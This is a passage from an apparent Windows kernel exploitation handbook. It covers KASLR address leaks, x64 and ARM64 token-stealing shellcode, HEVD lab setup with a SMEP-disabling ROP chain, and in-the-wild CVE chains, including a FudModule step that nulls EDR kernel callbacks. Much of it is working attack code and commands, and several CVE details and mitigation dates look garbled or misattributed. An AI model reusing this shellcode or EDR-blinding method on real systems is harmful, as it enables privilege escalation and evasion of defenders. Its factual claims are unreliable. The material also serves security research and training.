| `SystemPoolTagInformation` | 0x16 | Pool block VAs in tag statistics | Tag stats include VA ranges on some builds |

Methodology for enumerating new leaking classes:
```c
// Enumerate all NtQuerySystemInformation classes looking for pointer-shaped values
for (ULONG cls = 0; cls < 0x100; cls++) {
    BYTE buf[0x1000] = {};
    ULONG retLen = 0;
    NTSTATUS status = NtQuerySystemInformation(cls, buf, sizeof(buf), &retLen);
    if (NT_SUCCESS(status)) {
        // Scan buf for values with characteristics of kernel VAs
        // x64 kernel VAs: 0xFFFF800000000000 – 0xFFFFFFFFFFFFFFFF
        ScanForKernelPointers(buf, retLen);
    }
}
```

### 10.6.7 Hardware-Assisted KASLR Bypass: Spectre-PHT Timing Channel (Research Status 2024)

Spectre variant 1 (PHT — Pattern History Table mistraining) can be used to speculatively
read kernel addresses in contexts where speculative execution crosses privilege boundaries.
The core attack:

1. Mistrain the branch predictor using a Mistrain Gadget accessible from user mode
2. Trigger speculative execution of a kernel code path that loads a kernel pointer
3. Encode the pointer value into the cache via an array access indexed by the leaked bits
4. Measure access times to the encoding array to reconstruct the leaked bits

**2024 research status**:
- **Retpoline + IBRS**: Deployed on most Windows 11 systems with supported CPUs. These
  mitigations make Spectre-PHT substantially harder by preventing speculative indirect
  branches from crossing privilege boundaries. Not a complete mitigation — direct
  conditional branches (not indirect) are not protected by retpoline.
- **LFENCE insertion**: Windows kernel builds on AMD and Intel insert `LFENCE` instructions
  at key speculation barriers. Coverage is not complete — manually auditing kernel binary
  for unguarded conditional branches in sensitive paths remains a research avenue.
- **Practical exploitation difficulty in 2024**: Very high. Side-channel KASLR bypass
  in the kernel context requires: (a) an unmitigated speculative path in the kernel,
  (b) a cache timing side channel not blocked by cache partitioning, (c) stable timing
  on the target system. No publicly disclosed practical Spectre-based KASLR bypass
  against a fully-patched Windows 11 23H2+ system exists as of 2024. Active research area.

### 10.6.8 AFD.sys Pool Address Leak — CVE-2024-38193 Root Cause Detail

CVE-2024-38193 (patched August 2024, exploited by Lazarus Group) involves a use-after-free
in `afd.sys` (Ancillary Function Driver for WinSock). The root cause provides a kernel
pool address disclosure as a side effect of the UAF. See Section 10.11.2 for full
exploit chain analysis. From a pure KASLR bypass perspective:

The `_AFD_POLL_HANDLE_INFO` structure (freed prematurely) retains its valid kernel pool
address in the handle table for the duration of the race window. By reading the handle's
backing structure via `NtQueryObject` before the kernel detects the freed state, the
attacker obtains the pool VA of the freed object. This VA serves as:
1. A base address for computing the afd.sys pool region
2. An anchor for the heap spray placement calculations

```c
// Pseudo-code: leaking pool address from freed AFD handle
SOCKET sock = CreateAFDSocket();
HANDLE afdHandle = GetHandleForSocket(sock);

// Trigger the race condition that frees _AFD_POLL_HANDLE_INFO prematurely
TriggerAFDPollRace(sock);

// Query object info before kernel detects freed state
// Returns OBJECT_BASIC_INFORMATION including pool VA embedded in object header
OBJECT_BASIC_INFORMATION obi = {};
NtQueryObject(afdHandle, ObjectBasicInformation, &obi, sizeof(obi), NULL);
// obi fields include: HandleCount, PointerCount, GrantedAccess
// Object body VA is derivable from the OBJECT_HEADER pointer returned in certain builds

// The derived VA provides the afd.sys pool base + heap spray anchor
```

### 10.6.9 `win32kbase.sys` Handle Table Address Disclosure

A Win32k-specific kernel address leak identified in 2024 research involves the GDI
handle table's per-process entry in `win32kbase.sys`. The GDI handle table is partially
mapped into user mode (the `GdiSharedHandleTable` field in the PEB). On some 22H2 builds,
entries in the shared table include a kernel pointer field (`pKernelAddress`) that
was not zeroed before the user-mode mapping was updated.

```c
// Access GDI handle table leak from user mode
PEB* peb = (PEB*)__readgsqword(0x60);
PGDI_HANDLE_TABLE gdiTable = (PGDI_HANDLE_TABLE)peb->GdiSharedHandleTable;

// Create a GDI object to populate a table entry
HBITMAP hBmp = CreateBitmap(1, 1, 1, 32, NULL);
DWORD handle_index = (DWORD)(ULONG_PTR)hBmp >> 2;

// On vulnerable builds: gdiTable->Entries[handle_index].pKernelAddress != 0
PVOID kernelAddr = gdiTable->Entries[handle_index].pKernelAddress;
// kernelAddr is the kernel pool address of the GDI object → KASLR defeated
```

**Status**: Patched in builds 22621.3593+ (May 2024 Patch Tuesday). The `pKernelAddress`
field is now zeroed before the user-mode mapping reflects new GDI object allocations.
Unfixed on 22H2 builds below 22621.3593 and on 21H2 (which has different table layout).

---

## 10.7 Token Stealing Shellcode Pattern

### 10.7.1 The EPROCESS List Walk

The canonical kernel privilege escalation payload walks the doubly linked `EPROCESS`
list to find the SYSTEM process token, then copies it to the current process:

```nasm
; x64 token-stealing shellcode skeleton
; Assumes kernel code execution, SMEP bypassed (or not present), HVCI off

; Step 1: Get current process EPROCESS
; KPCR.PrcbData.CurrentThread → KTHREAD → KPROCESS → EPROCESS
mov rax, qword ptr gs:[0x188]       ; GS:0x188 = CurrentThread (KPCR.Prcb.CurrentThread)
mov rax, qword ptr [rax + 0x220]    ; KTHREAD.ApcState.Process → EPROCESS
                                     ; Offset varies by build — verify with dt nt!_KTHREAD

; Step 2: Find System process (PID 4) by walking EPROCESS list
; EPROCESS.UniqueProcessId at +0x440 (Win11 22H2)
; EPROCESS.ActiveProcessLinks at +0x448 (Win11 22H2)
mov rbx, rax                        ; save current EPROCESS

walk_list:
  mov rbx, qword ptr [rbx + 0x448]  ; EPROCESS.ActiveProcessLinks.Flink
  sub rbx, 0x448                    ; back to EPROCESS base
  cmp qword ptr [rbx + 0x440], 4    ; UniqueProcessId == 4 (System)?
  jne walk_list

; Step 3: Read SYSTEM token (EPROCESS+0x4b8 = Token EX_FAST_REF)
mov rcx, qword ptr [rbx + 0x4b8]    ; SYSTEM EPROCESS.Token
and rcx, ~0xF                       ; mask low 4 bits (reference count)

; Step 4: Write SYSTEM token into current process
and qword ptr [rax + 0x4b8], 0xF    ; clear token pointer, preserve refcnt bits
or qword ptr [rax + 0x4b8], rcx     ; set SYSTEM token

; Step 5: Return cleanly (restore stack, return to interrupted caller)
; ... restore registers, IRETQ or ret
```

### 10.7.2 Key Offsets (Windows 11 22H2 x64 — build 22621)

Always verify offsets with `dt nt!_EPROCESS` on the target build. These drift:

```
EPROCESS:
+0x440  UniqueProcessId       : Ptr64
+0x448  ActiveProcessLinks    : _LIST_ENTRY
+0x4b8  Token                 : _EX_FAST_REF   (mask low 4 bits)
+0x550  ImageFileName         : [15] UChar
```

**EX_FAST_REF decoding**:
```windbg
; Token pointer extraction (mask low 4 bits = reference count)
? (poi(poi(nt!PsInitialSystemProcess) + 0x4b8) & ~0xf)
```

### 10.7.3 Post-Exploitation: Privilege Enabling vs Token Theft

An alternative to full token theft — especially useful under HVCI where modifying
token pointers may be logged by the secure kernel — is **privilege enabling**:

```windbg
; Read current token's privilege bitmap
dt nt!_SEP_TOKEN_PRIVILEGES [token_addr + 0x048]
; +0x000 Present          : Uint8B   ; assigned privileges
; +0x008 Enabled          : Uint8B   ; currently enabled
; +0x010 EnabledByDefault : Uint8B

; Enable all Present privileges by setting Enabled = Present
; Write operation: KernelWrite8(token_addr + 0x050, present_value)
```

Relevant privilege bits:
- `SeDebugPrivilege` = bit 19 — open any process
- `SeImpersonatePrivilege` = bit 28 — critical for named pipe attacks
- `SeTcbPrivilege` = bit 6 — act as part of the OS
- `SeLoadDriverPrivilege` = bit 9 — load/unload kernel drivers

---

## 10.8 Mitigations Timeline

| Year / Build | Mitigation | Effect on Exploitation |
|---|---|---|
| Win8 (2012) | SMEP (Supervisor Mode Execution Prevention) | Kernel can no longer execute user-mode pages; requires kernel shellcode or ROP |
| Win10 RS4 (2018) | SMAP (Supervisor Mode Access Prevention) | Kernel cannot read/write user-mode memory without explicit `stac/clac` bracket; breaks user-mode data reads from kernel exploit |
| Win10 RS1 (2016) | NtQuerySystemInformation restrictions | Major KASLR bypasses (SystemModuleInformation) restricted to admin |
| Win10 20H1 (2020) | Segment Heap for kernel pool | Eliminates POOL_HEADER corruption → classic pool overflow chains broken |
| Win10 1703+ | CET (Control-flow Enforcement Technology) | Hardware shadow stack; makes ROP harder (requires CET-compatible gadgets); not universally enabled until Win11 |
| Win10 1903+ | Win32k syscall filtering expansion | Chrome, Edge block essentially all Win32k syscalls; Win32k exploits unusable for sandbox escape from these |
| Win10 1507+ | Kernel CFG (kCFG) | Indirect kernel function calls validated against CFG bitmap; degrades ROP chains |
| Win10 1507+ | VBS/HVCI | Kernel code pages read-only; no shellcode injection; exploits require code-reuse only. Not universal (disabled on many systems) |
| Win11 22H2+ | I/O Ring address validation | Fixes the specific IoRing kernel R/W primitive; architectural surface remains |
| Win11 24H2 | Administrator Protection | UAC replacement; generates new bypass research surface (9+ Project Zero variants) |

**HVCI deployment reality**: HVCI is enabled by default only on Secured-Core PCs and
specific enterprise configurations. Most consumer systems (gaming PCs, non-OEM builds)
run without HVCI. Check via `msinfo32` → Virtualization-Based Security. When targeting
a specific machine, verify HVCI status before choosing exploitation strategy.

---

## 10.9 HEVD as Learning Lab

### 10.9.1 Setup

HEVD (HackSys Extreme Vulnerable Driver) is the canonical kernel exploitation training
environment. Setup requires a two-machine configuration (host + target VM) for kernel
debugging.

**Environment requirements**:
```
Host (debugger):     Windows 10/11 x64, WinDbg Preview installed
Target VM:           Windows 10/11 x64 VM (VMware/Hyper-V), test signing enabled,
                     kernel debugging enabled (KDNET)
Driver:              HEVD.sys loaded on target (sc create HEVD type=kernel ...)
```

**Enable test signing on target VM**:
```cmd
bcdedit /set testsigning on
bcdedit /set nointegritychecks on     ; older systems
```

**Enable kernel debugging via KDNET** (network debugging):
```cmd
; On target VM (run as admin)
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4
; Then connect from host: WinDbg → Attach to kernel → Net: port=50000, key=1.2.3.4
```

### 10.9.2 HEVD Vulnerability Classes

| Vulnerability | IOCTL | Key Learning |
|---|---|---|
| Stack Overflow | 0x222003 | SMEP bypass via ROP; classic `ret` overwrite in kernel stack |
| Pool Overflow | 0x222043 | Post-Segment-Heap grooming; pool spray strategy |
| Use-After-Free | 0x222053 | UAF race condition; type confusion exploitation |
| NULL Pointer Dereference | 0x222023 | Map null page (historical); `MitigateNull` policy |
| Type Confusion | 0x22206B | Object type mismatch → controlled pointer dereference |
| Integer Overflow | 0x222033 | Size arithmetic leading to undersized allocation |
| Race Condition | 0x222063 | Win32 event + IOCTL timing; TOCTOU in kernel |
| Write-What-Where | 0x22200B | Direct arbitrary kernel write primitive (simplest exploitation path) |

### 10.9.3 Working Through Stack Overflow (with SMEP bypass)

```
1. Trigger HEVD stack overflow IOCTL (0x222003) with oversized buffer
2. Overwrite return address on kernel stack
3. SMEP blocks direct shellcode in user-mode pages
4. ROP chain in kernel space:
   a. Gadget: pop rsp; ret  → pivot to kernel ROP stack
   b. Gadgets to disable SMEP: cr4 manipulation
      - mov rax, cr4 ; and rax, ~0x100000 ; mov cr4, rax
   c. ret to shellcode (now executable, SMEP cleared)
5. Token-stealing shellcode runs → SYSTEM shell
```

Use WinDbg TTD (Time Travel Debugging) on the target to step backward from the crash
and understand the overflow at the exact point of corruption.

### 10.9.4 Critical WinDbg Commands for HEVD Work

```windbg
; List processes
!process 0 0

; Switch into target process context
.process /i /p [eprocess_addr]

; Reload user symbols for that process
.reload /user

; Current process token
!token -n

; Find SYSTEM token manually
? poi(nt!PsInitialSystemProcess) + 0x4b8
? (poi(poi(nt!PsInitialSystemProcess) + 0x4b8) & ~0xf)

; Full EPROCESS dump
!process -1 1

; Object header at address (note: TypeIndex XOR'd with ObHeaderCookie on Win8+)
dt nt!_OBJECT_HEADER [addr]
? nt!ObHeaderCookie

; All handles in a process
!handle 0 f [eprocess_addr]

; Security descriptor on object
!sd [sd_addr]
!acl [acl_addr]

; Impersonation state of current thread
!thread
dt nt!_ETHREAD [addr] ClientSecurity
```

### 10.9.5 HEVD v3.x Updates: ARM64 Support and New Exploit Classes

HEVD v3.x (released 2023–2024) added significant new content beyond the original x64
exploit classes:

**ARM64 support**:

HEVD v3.x ships `HEVD_ARM64.sys` targeting Windows 11 on ARM64 (Snapdragon X Elite,
Surface Pro X). ARM64 kernel exploitation differs from x64 in several key ways:

| Aspect | x64 | ARM64 |
|---|---|---|
| SMEP equivalent | `CR4.SMEP` bit | `SCTLR_EL1.PAN` (Privileged Access Never) |
| ROP gadget density | Very high (variable-length instructions) | Lower (fixed 4-byte instructions, fewer useful gadgets) |
| KASLR entropy | 9 bits (ntoskrnl) | 9 bits (same policy) |
| Token theft offsets | Different per build | Different per build, ARM64-specific values |
| Calling convention | RCX, RDX, R8, R9 | X0, X1, X2, X3 |

ARM64 HEVD stack overflow exploitation:
```nasm
; ARM64 token-stealing shellcode skeleton
; Assumes kernel execution via ROP chain through PAN bypass

; Step 1: Get current thread (TPIDR_EL1 = KPCR equivalent on ARM64)
mrs x0, TPIDR_EL1               ; x0 = KPCR
ldr x0, [x0, #0x008]            ; CurrentThread offset (verify per build)
ldr x0, [x0, #0x230]            ; KTHREAD.ApcState.Process (ARM64 build offset)

; Step 2: Walk EPROCESS list (same logic, ARM64 offsets differ)
mov x1, x0                      ; save current EPROCESS
walk_loop:
  ldr x1, [x1, #0x448]          ; ActiveProcessLinks.Flink (verify on ARM64 build)
  sub x1, x1, #0x448
  ldr x2, [x1, #0x440]          ; UniqueProcessId
  cmp x2, #4
  b.ne walk_loop

; Step 3–5: same token steal logic as x64, using ARM64 load/store
```

**New HEVD v3.x vulnerability classes**:

| New Class | IOCTL | Description |
|---|---|---|
| Arbitrary Read | 0x222107 | Kernel arbitrary read primitive — teaches KASLR bypass chaining |
| Double Fetch | 0x22210B | TOCTOU on user-mode buffer accessed twice without capture |
| Memory Disclosure | 0x22210F | Uninitialized pool memory returned to user — Bochspwn methodology |
| Null Termination | 0x222113 | Off-by-one in string handling → pool overflow variant |

### 10.9.6 HEVD on Windows 11 24H2 — Vulnerable Modules by Design

HEVD is intentionally vulnerable. On 24H2 (build 26100), the following HEVD modules
behave as follows:

| HEVD Module | Status on 24H2 | Notes |
|---|---|---|
| Stack Overflow (0x222003) | Vulnerable by design | SMEP bypass still required |
| Pool Overflow (0x222043) | Vulnerable by design | 24H2 Segment Heap hardening affects reliability of adjacent object spray — requires updated grooming technique |
| UAF (0x222053) | Vulnerable by design | Race condition window unchanged |
| Write-What-Where (0x22200B) | Vulnerable by design | Direct primitive, unaffected by heap hardening |
| NULL Ptr Dereference (0x222023) | Functionally broken on 24H2 | Low VA allocation blocked; historical interest only |

**Updated grooming for Pool Overflow on 24H2**: The type isolation improvement
(Section 10.1.6) means that spraying `CM` (registry) objects into the same subsegment
as HEVD's vulnerable `Hack` pool tag object is no longer reliable. Updated approach:
identify which subsystem HEVD's allocation belongs to and use same-subsystem sprays
(e.g., HEVD IOCTL-allocated objects of the same size from a different vulnerability).

### 10.9.7 Community Solutions and Modern Workflow

**Notable public writeups for HEVD challenges**:

- **OffSecResearch (Offensive Security)**: Published HEVD solutions for Pool Overflow
  on Segment Heap (post-20H1), demonstrating the updated spray technique using
  `NtCreateNamedPipeFile` for NonPaged pool grooming. Available on OffSec's blog.
  Key insight: `NtCreateNamedPipeFile` allocates `NpFc` (Named Pipe File Control)
  objects in a predictable size range.

- **SinaeiPasha (sina.pasha.io)**: Deep-dive writeup on HEVD UAF exploitation on
  Windows 11 22H2, including TTD-based root cause analysis and updated offsets for
  the `_EPROCESS` token steal. Notable for the TTD workflow: recording the IOCTL
  trigger with WinDbg TTD and stepping backward through the use-after-free.

**HEVD + WinDbg Preview modern workflow**:

```
1. Target VM: WinDbg Preview as both host debugger and TTD recorder
   - TTD: File → Start Recording → attach to exploit process
   - Trigger IOCTL → crash recorded as .run file

2. Post-crash TTD analysis:
   !ttdext.tt 0                 ; go to start of recording
   g                            ; run to exception
   .time                        ; show position in trace

3. Backward analysis from crash:
   !ttdext.tt -1                ; step backward
   ; Identify last instruction that modified the corrupted address
   ; Use memory access breakpoints in TTD:
   ba w8 [target_addr]          ; break-on-write (hardware)
   g-                           ; run backward to the write

4. Symbol resolution for HEVD:
   .sympath+ C:\path\to\hevd\symbols
   .reload /f HEVD.sys
   lm m HEVD                    ; verify HEVD module loaded
   x HEVD!*                     ; list HEVD exported symbols
```

---

## 10.10 Win32k Attack Surface in 2024

### 10.10.1 Current State

Win32k remains an active vulnerability class despite aggressive mitigation:

**What still works**:
- Logic bugs and type confusion that do not require heap corruption (HVCI-bypass compatible)
- Bugs in `win32kfull` legacy GDI paths (metafile rendering, printer driver callbacks)
- Bugs in WNDPROC hooking, message routing, USER handle type mismatches
- Win32k exploits for non-sandbox contexts (desktop apps, services — vast majority of targets)

**What is effectively mitigated for sandbox escape**:
- Any win32k exploit is useless against Chrome/Edge renderer processes due to win32k
  syscall filtering (`PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY`)
- Win32k lockdown via `SetProcessMitigationPolicy(ProcessSystemCallDisablePolicy)`
  blocks all `NtUser*` and `NtGdi*` syscalls

**Active exploitation in 2024**: NSA, Lazarus Group, and others continue deploying win32k
0-days for targeting non-Chromium applications (Office documents, desktop apps with
renderer processes that have not adopted win32k lockdown).

### 10.10.2 CVE-2021-1732 — In-the-Wild Analysis

CVE-2021-1732 was used in the wild by an advanced threat actor and analyzed in depth
by Project Zero. The bug is a type confusion in Win32k's USER object handling:

- **Component**: `win32kfull.sys` — `NtUserSetWindowDisplayAffinity` / window object handling
- **Root cause**: During a specific window state transition, the kernel temporarily
  accessed a USER object through a stale type assumption. A `tagWND` (window object)
  could be confused with another USER object type that had an exploitable function
  pointer at the same offset.
- **Primitive**: Controlled kernel read/write via the confused object's embedded pointer
- **Exploitation chain**: Type confusion → controlled DWORD write → overwrite
  `_tagWND.cbWndExtra` to expand the "extra bytes" field → use the expanded field
  to read/write arbitrary kernel memory → token theft → SYSTEM

The Project Zero analysis is the reference implementation for Win32k type confusion
exploitation methodology.

### 10.10.3 CVE-2024-21338 — Win32k (appid.sys) UAF Exploited by Lazarus Group

CVE-2024-21338, patched in February 2024 (Patch Tuesday), was exploited by the Lazarus
Group (North Korea) as part of their FudModule v2 rootkit capability. This represents
one of the most sophisticated in-the-wild kernel exploits of 2024.

**Component and IOCTL**:

The vulnerability is in `appid.sys` (Application Identity driver), not in `win32k.sys`
directly, but it is grouped with Win32k in Microsoft's classification because it is
invoked via a Win32k-adjacent code path. The vulnerable IOCTL code is `0x22A018`.

```c
// IOCTL dispatch path (reverse-engineered from appid.sys)
// DeviceIoControl(hDevice, 0x22A018, InputBuffer, InputSize, OutputBuffer, OutputSize, ...)

// Internal handler: AipSmartHashCallback
NTSTATUS AipSmartHashCallback(
    PIRP Irp,
    PIO_STACK_LOCATION IrpSp
) {
    PAIP_HASH_REQUEST Request = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    // Request->CallbackTable is trusted user-mode input — vulnerability here
    PAIP_CALLBACK_TABLE pTable = Request->CallbackTable;  // user-controlled pointer
    // pTable is dereferenced without validation...
}
```

**Root cause — callback table overwrite**:

`AipSmartHashCallback` processes a request structure that contains a pointer to a
callback table (`CallbackTable`). In vulnerable builds, this pointer is read from the
user-supplied input buffer without validating that it points to a legitimate kernel
callback table. The attacker supplies a crafted `AIP_HASH_REQUEST` with `CallbackTable`
pointing to attacker-controlled memory in kernel space (obtained via a prior KASLR leak).

```c
// Attacker-crafted AIP_HASH_REQUEST (pseudo-structure)
typedef struct _AIP_HASH_REQUEST {
    ULONG   Version;
    ULONG   Flags;
    PVOID   CallbackTable;    // ← set to attacker-controlled kernel buffer
    PVOID   Context;
    ULONG   HashAlgorithm;
    BYTE    Data[0];
} AIP_HASH_REQUEST;

// Attacker-controlled callback table in kernel space
typedef struct _AIP_CALLBACK_TABLE {
    PVOID HashCallback;       // ← set to attacker's kernel ROP/shellcode pivot
    PVOID FinalizeCallback;
    PVOID ErrorCallback;
} AIP_CALLBACK_TABLE;
```

**Full exploit chain — FudModule v2**:

```
Phase 1: KASLR bypass
  → CVE-2024-38193 (afd.sys UAF) provides pool address leak
  → Compute appid.sys base from pool region

Phase 2: Kernel arbitrary R/W setup
  → IOCTL 0x22A018 with crafted CallbackTable pointer
  → CallbackTable[0] (HashCallback) invoked by AipSmartHashCallback
  → HashCallback = ROP gadget in appid.sys → pivots to kernel ROP chain
  → ROP chain establishes kernel R/W via mapped MDL

Phase 3: Callback nullification (EDR bypass — FudModule signature)
  → Enumerate kernel callback tables:
     PsSetCreateProcessNotifyRoutine callbacks
     PsSetCreateThreadNotifyRoutine callbacks
     PsSetLoadImageNotifyRoutine callbacks
     CmRegisterCallback callbacks
  → Null out EDR driver entries from callback arrays
  → EDR driver (e.g., CrowdStrike, SentinelOne kernel sensor) no longer receives events

Phase 4: Token steal → SYSTEM
  → Standard EPROCESS list walk
  → Copy SYSTEM token to current process
```

```windbg
; Verify appid.sys is loaded
lm m appid

; Find AipSmartHashCallback (address varies by build)
x appid!Aip*

; Inspect IOCTL dispatch table for 0x22A018
dt appid!_DRIVER_EXTENSION [addr]
!drvobj appid 7

; Check kernel callback arrays (post-exploit verification)
; Process create callbacks
dq nt!PspCreateProcessNotifyRoutine L0x40
; Image load callbacks
dq nt!PspLoadImageNotifyRoutine L0x10
```

### 10.10.4 CVE-2024-26218 — Win32k EOP (March 2024)

CVE-2024-26218, patched in the March 2024 Patch Tuesday, is a Win32k elevation of
privilege vulnerability in `win32kfull.sys`. Microsoft classified it as Important
(CVSS 7.8) with exploitation assessed as "More Likely."

**Known details** (from patch diffing and limited public disclosure):
- Affects the `NtUserMNDragOver` / menu drag-and-drop code path in `win32kfull.sys`
- Root cause: incorrect bounds check on a menu item index during drag-over processing
- Leads to an out-of-bounds write into the menu object's item array
- The OOB write overwrites the callback pointer of an adjacent menu item
- Exploitation: trigger the OOB write to overwrite the adjacent item's `dwTypeData`
  pointer, then call `GetMenuItemInfo` on the adjacent item → kernel reads from
  attacker-controlled address → controlled kernel read
- Combined with a separate controlled write, constitutes a full R/W primitive

Patch diff analysis shows `win32kfull!MNSetCapture` now includes additional bounds
validation on the drag-over menu item index parameter.

### 10.10.5 Win32k Syscall Filtering Improvements in 24H2

Windows 11 24H2 extends the Win32k syscall filtering capability available to
AppContainer sandboxes:

**New syscall restrictions for AppContainer (build 26100)**:

The following `NtUser*` syscalls that were previously allowed for AppContainer processes
are now blocked by default in 24H2 AppContainer sandboxes:

| Syscall | Reason Blocked |
|---|---|
| `NtUserSetWindowLongPtr` | Historical source of tagWND type confusion bugs |
| `NtUserThunkedMenuItemInfo` | Menu type confusion attack surface |
| `NtUserSetMenuItemInfo` | Menu object manipulation |
| `NtUserSendInput` | Input injection surface reduction |
| `NtUserSetWindowsHookEx` | Hook-based UAF attack surface |

Applications can opt back into these syscalls via a manifest attribute
(`uap10:allowedSystemCalls`) for backwards compatibility. The default-deny posture
means new AppContainer-sandboxed applications (Edge WebView2, UWP) no longer have
access to these historically dangerous APIs.

From a research standpoint: the blocking of `NtUserSetWindowLongPtr` and
`NtUserThunkedMenuItemInfo` in AppContainer is a significant reduction in the
Win32k sandbox escape surface. The primary remaining Win32k attack surface for
AppContainer escape in 24H2 is in `win32kbase` syscalls that remain allowed
(window creation, message passing, basic USER operations).

---

## 10.11 In-the-Wild Kernel Exploits 2024–2025

### 10.11.1 Overview Table

| CVE | Driver | Group | Method | Impact |
|-----|--------|-------|--------|--------|
| CVE-2024-21338 | appid.sys | Lazarus (DPRK) | IOCTL + callback table overwrite → callback nullification | SYSTEM + EDR bypass |
| CVE-2024-38193 | afd.sys | Lazarus (DPRK) | UAF → pool R/W primitive | SYSTEM |
| CVE-2024-30051 | dwm.sys (DWM) | QakBot | Heap UAF in Desktop Window Manager | SYSTEM |
| CVE-2025-21333 | Hyper-V NTFS (ntfs.sys in guest) | Unknown (ITW) | Guest NTFS driver exploit → escape to host | Host SYSTEM |
| CVE-2025-21335 | Hyper-V VSP | Unknown (ITW) | Hyper-V Synthetic Video Provider UAF | Host SYSTEM |

All five represent different exploitation classes. CVE-2024-21338 and CVE-2024-38193
were used together by Lazarus (FudModule v2). CVE-2024-30051 is notable for being
used by QakBot infrastructure post-takedown, indicating another threat actor adopted
it. The two Hyper-V CVEs (2025) represent a shift toward hypervisor escape as a
primary target.

### 10.11.2 CVE-2024-38193 — afd.sys UAF Deep Analysis

**Driver**: `afd.sys` — Ancillary Function Driver for WinSock (Windows Sockets).
Loaded by default on all Windows systems.

**Vulnerable function**: `AfdPollHandleTransportEndpointChange`

**Vulnerable structure**: `_AFD_POLL_HANDLE_INFO`

```c
// _AFD_POLL_HANDLE_INFO layout (reverse-engineered from afd.sys)
typedef struct _AFD_POLL_HANDLE_INFO {
    HANDLE          Handle;           // +0x000: handle to transport endpoint
    ULONG           Events;           // +0x008: poll event mask (AFD_POLL_*)
    NTSTATUS        PollStatus;       // +0x00c: status of last poll event
    PVOID           TransportEndpoint;// +0x010: pointer to transport endpoint object
    LIST_ENTRY      PollHandleList;   // +0x018: linked list of poll handles
    PIRP            PollIrp;          // +0x028: IRP for this poll request
} AFD_POLL_HANDLE_INFO, *PAFD_POLL_HANDLE_INFO;
```

**Root cause — UAF in `AfdPollHandleTransportEndpointChange`**:

`AfdPollHandleTransportEndpointChange` is a callback registered on transport endpoint
state changes. When a polling operation is in flight and the associated transport endpoint
is closed by a concurrent thread, a race condition occurs:

1. Thread A: `AfdPoll` is called with endpoint E, allocating `AFD_POLL_HANDLE_INFO`
   structure H in NonPagedPool. H's `TransportEndpoint` points to E.
2. Thread B: Closes endpoint E. The endpoint object's reference count reaches zero.
   `AfdDestroyTransportEndpoint` frees E and calls `AfdPollHandleTransportEndpointChange`
   to notify pending poll operations.
3. `AfdPollHandleTransportEndpointChange` walks the poll handle list. It reads
   `H->PollHandleList.Flink` to find the next handle.
4. **Race**: Between step 2 (E freed) and step 3 (list walk), Thread A's poll
   completion path has already begun freeing H. If Thread A's `ExFreePoolWithTag(H)`
   completes before step 3's list walk dereferences `H->PollHandleList.Flink`, the
   list walk dereferences freed memory — a classic UAF.

**Lazarus exploitation technique — kernel heap spray using `NtAllocateVirtualMemory`**:

After the UAF frees `AFD_POLL_HANDLE_INFO` (typically 0x30 bytes in the NonPagedPool
LFH bucket), Lazarus' exploit sprays the freed slot with a controlled structure. The
spray technique is notable: instead of using standard kernel object spray primitives,
the exploit uses `NtAllocateVirtualMemory` with `MEM_PHYSICAL` flag to allocate memory
that is then mapped into kernel space via a crafted MDL.

```c
// Lazarus kernel heap spray technique (pseudo-code, from Avast/ESET analysis)

// Step 1: Free AFD_POLL_HANDLE_INFO (trigger UAF)
TriggerAFDRace(sock1, sock2);  // race condition frees the structure

// Step 2: Spray freed 0x30-byte LFH slot
// Lazarus uses NtAllocateVirtualMemory to allocate user pages at specific VAs
// then creates an MDL mapping them into kernel NonPaged VA range
PVOID userPage = NULL;
SIZE_T regionSize = 0x1000;
NtAllocateVirtualMemory(GetCurrentProcess(), &userPage, 0, &regionSize,
                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// Fill userPage with fake AFD_POLL_HANDLE_INFO
// TransportEndpoint → fake endpoint object
// PollHandleList.Flink → attacker-controlled address
// PollIrp → fake IRP with crafted stack location

// Step 3: Create MDL to map user page into kernel space
// (requires a kernel write primitive from a prior step, or uses a separate primitive)
// MDL maps userPage at the freed AFD_POLL_HANDLE_INFO's NonPaged VA

// Step 4: Trigger use of freed pointer
// AfdPollHandleTransportEndpointChange runs with the fake structure
// Follows PollHandleList.Flink → controlled dereference
// Follows PollIrp → IRP completion path → IoCompleteRequest on fake IRP
// Fake IRP's CompletionRoutine → attacker shellcode/ROP
```

**WinDbg analysis commands for CVE-2024-38193 research**:

```windbg
; Load afd.sys symbols
.reload /f afd.sys

; Find AfdPollHandleTransportEndpointChange
x afd!AfdPollHandleTransportEndpointChange

; Set breakpoint on poll handle free path
bp afd!AfdFreeRemotePollHandle

; Inspect AFD_POLL_HANDLE_INFO at address
dt afd!_AFD_POLL_HANDLE_INFO [addr]

; Check LFH bucket for 0x30-byte allocations in afd.sys pool tag space
!poolused 2 AFDp

; Find AFD transport endpoint objects
dt afd!_AFD_ENDPOINT [addr]
; +0x000 Type              : Uint2B
; +0x004 Size              : Uint2B
; +0x008 ReferenceCount    : Int4B   ← watch for zero (freed endpoint)
```

**Patch analysis**:

The patch (KB5041585, August 2024) adds a reference count check in
`AfdPollHandleTransportEndpointChange` before dereferencing `AFD_POLL_HANDLE_INFO`.
The poll handle's `ReferenceCount` is now checked before walking the list, and the
walk is protected by a critical section that was absent in the vulnerable code:

```c
// Patched pseudo-code in AfdPollHandleTransportEndpointChange
AfdAcquirePollLock(PollHandleInfo);  // ← new: acquire lock before list walk
if (AfdIsPollHandleValid(PollHandleInfo)) {  // ← new: reference check
    // ... original list walk ...
}
AfdReleasePollLock(PollHandleInfo);  // ← new: release after walk
```

### 10.11.3 CVE-2024-30051 — DWM Heap UAF (QakBot)

**Driver/Component**: Desktop Window Manager (`dwm.exe` / kernel component `win32kfull.sys`
session heap, DWM-specific allocation).

**Attribution**: Used by the threat actor operating QakBot infrastructure. Kaspersky
and DBAPPSecurity published analyses in May 2024.

**Root cause**: A heap UAF in the DWM (Desktop Window Manager) compositor. The DWM
runs as a privileged Windows service (`dwm.exe`) under `NT AUTHORITY\SYSTEM` + `Session`.
The vulnerability is in the DWM's internal window composition queue.

**Exploitation impact**: Elevating from a standard user to `SYSTEM` by hijacking the
DWM process's execution context. DWM runs as SYSTEM with `SeDebugPrivilege` enabled,
making it a high-value token theft target.

**Key detail for researchers**: The DWM compositor uses a separate heap region in the
session pool, not the standard NonPagedPool. Bugs in DWM's session heap are distinct
from standard kernel pool bugs — they run in a different pool region with slightly
different Segment Heap metadata layout.

### 10.11.4 CVE-2025-21333 / CVE-2025-21335 — Hyper-V Escape

